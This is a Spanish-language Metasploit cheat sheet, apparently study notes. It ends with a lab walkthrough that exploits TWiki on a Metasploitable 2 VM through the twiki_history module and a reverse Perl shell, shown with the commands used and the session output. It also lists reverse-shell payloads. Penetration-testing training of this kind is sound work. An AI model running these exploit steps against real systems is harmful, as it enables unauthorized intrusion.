# Metasploit

## Descripción

Metasploit Framework es la **plataforma de pentesting más utilizada del mundo**. Permite buscar, configurar y lanzar exploits contra sistemas objetivo, gestionar sesiones de acceso, y realizar post-explotación de forma estructurada y automatizada.

---

## Iniciar Metasploit

```shell
msfconsole
```

---

## Estructura básica de uso

Siempre se sigue este flujo:

```
search → use → show options → set → run
```

### 1. Buscar un módulo

```shell
search twiki
search type:exploit platform:linux
search cve:2009-1185
```

### 2. Seleccionar un módulo

```shell
use exploit/unix/webapp/twiki_history
```

### 3. Ver opciones disponibles

```shell
show options
```

### 4. Configurar opciones

```shell
set RHOSTS 192.168.56.101      # IP de la víctima
set LHOST 192.168.56.102       # IP de Kali (para reverse shell)
set LPORT 8888                 # Puerto donde escucharemos
set URI /twiki/bin             # Ruta específica del exploit
```

### 5. Elegir payload

```shell
show payloads                  # Ver payloads compatibles
set PAYLOAD cmd/unix/reverse_perl
```

### 6. Lanzar el exploit

```shell
run
```

---

## Payloads más comunes

| Payload | Descripción |
|---------|-------------|
| `cmd/unix/reverse_perl` | Reverse shell en Perl |
| `cmd/unix/reverse_bash` | Reverse shell en Bash |
| `cmd/unix/reverse_netcat` | Reverse shell con Netcat |
| `cmd/unix/python/meterpreter/reverse_tcp` | Meterpreter via Python |
| `windows/meterpreter/reverse_tcp` | Meterpreter para Windows |

---

## Gestión de sesiones y jobs

```shell
jobs          # Ver handlers activos en background
jobs -K       # Matar TODOS los jobs activos (útil cuando el puerto está ocupado)
sessions      # Ver sesiones abiertas
sessions -i 1 # Interactuar con la sesión 1
```

---

## Opciones avanzadas útiles

```shell
set DisablePayloadHandler true   # No levanta listener (útil si usas nc externo)
set DisablePayloadHandler false  # Metasploit gestiona el listener (por defecto)
set VERBOSE true                 # Ver el payload exacto que se envía
```

---

## Errores comunes y soluciones

| Error | Causa | Solución |
|-------|-------|----------|
| `Handler failed to bind` | Puerto ocupado por sesión anterior | Ejecutar `jobs -K` y cambiar `LPORT` |
| `Exploit completed, but no session was created` | Payload no compatible o conectividad | Cambiar payload, verificar LHOST/LPORT |
| `No payload configured` | Payload por defecto no compatible | Ejecutar `set PAYLOAD cmd/unix/reverse_perl` |

> **Truco clave:** Cuando aparece `Handler failed to bind`, antes de cambiar el puerto prueba siempre `jobs -K` dentro de msfconsole. Muchas veces hay un handler anterior del mismo módulo ocupando el puerto.

---

## Ejemplo real — Máquina Metasploitable 2

Explotamos TWiki mediante el módulo `twiki_history` (CVE relacionado con el parámetro `rev`):

```shell
use exploit/unix/webapp/twiki_history
set RHOSTS 192.168.56.101
set LHOST 192.168.56.102
set LPORT 8888
set URI /twiki/bin
set PAYLOAD cmd/unix/reverse_perl
set DisablePayloadHandler false
jobs -K
run
```

**Resultado:**

```
[*] Started reverse TCP handler on 192.168.56.102:8888
[+] Successfully sent exploit request
[*] Command shell session 1 opened (192.168.56.102:8888 -> 192.168.56.101:59355)
```

Obtuvimos shell como `www-data`.
